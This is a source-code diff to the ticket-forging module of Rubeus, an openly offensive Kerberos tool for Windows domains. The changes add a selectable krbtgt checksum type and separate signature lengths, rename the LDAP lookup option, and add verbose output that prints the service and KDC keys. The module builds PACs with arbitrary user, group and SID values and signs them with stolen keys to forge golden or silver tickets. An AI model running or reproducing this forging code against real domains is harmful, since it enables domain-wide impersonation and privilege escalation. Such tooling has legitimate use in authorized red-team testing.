@@ -2,6 +2,7 @@
 using System.Text;
 using System.Security.Principal;
 using System.Collections.Generic;
+using System.Linq;
 using System.DirectoryServices;
 using Rubeus.lib.Interop;
 using Rubeus.Kerberos.PAC;
@@ -11,7 +12,7 @@ namespace Rubeus
 {
     public class ForgeTickets
     {
-        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, bool fromldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
+        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256, bool ldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
         {
             // vars
             int c = 0;
@@ -93,7 +94,7 @@ namespace Rubeus
             }
 
             // if /fromldap was passed make the LDAP queries
-            if (fromldap)
+            if (ldap)
             {
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
@@ -104,6 +105,7 @@ namespace Rubeus
                     {
                         domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                     }
+                    Console.WriteLine("[*] Retrieving user information over LDAP from domain controller {0}", domainController);
                     directoryObject = Networking.GetLdapSearchRoot(ldapcred, "", domainController, domain);
                     userSearcher = new DirectorySearcher(directoryObject);
                     // enable LDAP paged search to get all results, by pages of 1000 items
@@ -202,6 +204,7 @@ namespace Rubeus
                             // build the group membership search filter and reuse the usersearcher object
                             try
                             {
+                                Console.WriteLine("[*] Retrieving group information over LDAP from domain controller {0}", domainController);
                                 string groupSearchFilter = "";
                                 foreach (string groupDN in u.Properties["memberof"])
                                 {
@@ -253,6 +256,7 @@ namespace Rubeus
                         {
                             try
                             {
+                                Console.WriteLine("[*] Retrieving netbios name over LDAP from domain controller {0}", domainController);
                                 directoryObject = Networking.GetLdapSearchRoot(ldapcred, String.Format("CN=Configuration,{0}", domainDN), domainController, domain);
                                 userSearcher = new DirectorySearcher(directoryObject);
                                 // enable LDAP paged search to get all results, by pages of 1000 items
@@ -302,13 +306,15 @@ namespace Rubeus
             }
             else if (String.IsNullOrEmpty(netbiosName) || String.IsNullOrEmpty(sid))
             {
-                Console.WriteLine("[X] To forge tickets without specifying '/fromldap' both '/netbios' and '/sid' are required.");
+                Console.WriteLine("[X] To forge tickets without specifying '/ldap' both '/netbios' and '/sid' are required.");
                 return;
             }
 
             // initialize some structures
             KRB_CRED cred = new KRB_CRED();
             KrbCredInfo info = new KrbCredInfo();
+
+            Console.WriteLine("[*] Building PAC");
 
             // overwrite any LogonInfo fields here sections
             if (!String.IsNullOrEmpty(netbiosName))
@@ -364,7 +370,7 @@ namespace Rubeus
             ClientName cn = new ClientName(DateTime.UtcNow, user);
             SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
             SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
-            int sigLength = 12;
+            int svrSigLength = 12, kdcSigLength = 12;
 
             UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
 
@@ -377,7 +383,8 @@ namespace Rubeus
                 random.NextBytes(randKeyBytes);
                 svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                 kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
-                sigLength = 16;
+                svrSigLength = 16;
+                kdcSigLength = 16;
             }
             else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
             {
@@ -392,13 +399,29 @@ namespace Rubeus
                 return;
             }
 
+            // if the krbtgt key is specified, use the checksum type also specified
+            if (krbKey != null)
+            {
+                kdcSigData.SignatureType = krbeType;
+                if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
+                {
+                    kdcSigLength = 12;
+                }
+                else
+                {
+                    kdcSigLength = 16;
+                }
+            }
+
+            Console.WriteLine("[*] Generating EncTicketPart");
             EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags, cn.ClientId);
 
             // generate clear signatures
-            svrSigData.Signature = new byte[sigLength];
-            kdcSigData.Signature = new byte[sigLength];
-            Array.Clear(svrSigData.Signature, 0, sigLength);
-            Array.Clear(kdcSigData.Signature, 0, sigLength);
+            Console.WriteLine("[*] Signing PAC");
+            svrSigData.Signature = new byte[svrSigLength];
+            kdcSigData.Signature = new byte[kdcSigLength];
+            Array.Clear(svrSigData.Signature, 0, svrSigLength);
+            Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
 
             // set krbKey to serviceKey if none is given
             if (krbKey == null)
@@ -434,10 +457,12 @@ namespace Rubeus
 
 
             // encrypt the EncTicketPart
+            Console.WriteLine("[*] Encrypting EncTicketPart");
             byte[] encTicketData = decTicketPart.Encode().Encode();
             byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);
 
             // initialize the ticket and add the enc_part
+            Console.WriteLine("[*] Generating Ticket");
             Ticket ticket = new Ticket(domain.ToUpper(), sname);
             ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);
 
@@ -480,6 +505,10 @@ namespace Rubeus
             // add the ticket_info into the cred object
             cred.enc_part.ticket_info.Add(info);
 
+            Console.WriteLine("[*] Generated KERB-CRED");
+
+
+
             byte[] kirbiBytes = cred.Encode().Encode();
 
             string kirbiString = Convert.ToBase64String(kirbiBytes);
@@ -492,6 +521,26 @@ namespace Rubeus
             {
                 Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
             }
+            Console.WriteLine("");
+
+            // output some ticket information
+            Console.WriteLine("[*] Domain         : {0} ({1})", ticket.realm, kvi.LogonDomainName);
+            Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
+            Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
+            Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+            Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));
+            Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);
+            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbKey));
+            Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
+            Console.WriteLine("[*] Service        : {0}", parts[0]);
+            Console.WriteLine("[*] Target         : {0}", parts[1]);
+            var dateFormat = "dd/MM/yyyy HH:mm:ss";
+            Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(dateFormat));
+            Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(dateFormat));
+            Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(dateFormat));
+            Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(dateFormat));
+            Console.WriteLine("");
+
             Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
 
             if (Program.wrapTickets)
